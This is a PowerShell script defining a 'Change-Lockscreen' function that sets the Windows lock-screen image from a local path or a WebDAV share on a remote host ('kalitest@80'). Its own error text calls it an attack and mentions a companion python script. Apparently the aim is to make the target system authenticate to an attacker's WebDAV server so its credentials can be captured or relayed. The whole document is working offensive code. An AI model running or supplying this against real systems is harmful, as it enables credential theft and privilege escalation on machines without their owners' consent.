function Change-Lockscreen
{
    <#
    .PARAMETER Path
    Path of the new image

    .EXAMPLE
    PS C:\> . .\Change-Lockscreen.ps1
    PS C:\> Change-Lockscreen -FullPath C:\Users\pentest\test.jpg
    PS C:\> Change-Lockscreen -FullPath \\kalitest@80\eeereb\abcd.jpg
    PS C:\> Change-Lockscreen -Webdav \\kalitest@80\
    #>

    [CmdletBinding()]
	Param (
	    [Parameter(Mandatory=$false)]
	    [String]
        $Webdav,     
  
	    [Parameter(Mandatory=$false)]
	    [String]
        $FullPath     
    ) 
    
  
    [Windows.System.UserProfile.LockScreen,Windows.System.UserProfile,ContentType=WindowsRuntime] | Out-Null

    Add-Type -AssemblyName System.Runtime.WindowsRuntime

    $asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]
    Function Await($WinRtTask, $ResultType) {
        $asTask = $asTaskGeneric.MakeGenericMethod($ResultType)
        $netTask = $asTask.Invoke($null, @($WinRtTask))
        $netTask.Wait(-1) | Out-Null
        $netTask.Result
    }
    Function AwaitAction($WinRtAction) {
        $asTask = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and !$_.IsGenericMethod })[0]
        $netTask = $asTask.Invoke($null, @($WinRtAction))
        $netTask.Wait(-1) | Out-Null
    }

    [Windows.Storage.StorageFile,Windows.Storage,ContentType=WindowsRuntime] | Out-Null
    $originalImageStream = ([Windows.System.UserProfile.LockScreen]::GetImageStream())
    
    $randomPath = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
		
	try{
		IF($Webdav){
		$image = Await ([Windows.Storage.StorageFile]::GetFileFromPathAsync($Webdav+$randomPath+'\'+'image.jpg')) ([Windows.Storage.StorageFile])
		}
		IF($FullPath){
		$image = Await ([Windows.Storage.StorageFile]::GetFileFromPathAsync($FullPath)) ([Windows.Storage.StorageFile])
		}
	}
    catch {
        write-output "Attack Failed! Possible solutions:
					  1 - Wait one minute and try again in a new powershell session
					  2 - Restart python script"
        return
    } 

    
    AwaitAction ([Windows.System.UserProfile.LockScreen]::SetImageFileAsync($image))
    try{ 
        AwaitAction  ([Windows.System.UserProfile.LockScreen]::SetImageStreamAsync($originalImageStream))
    }
    catch {
        write-output "Windows Spotlight mode in use. Specified lockscreen image set"
    } 
}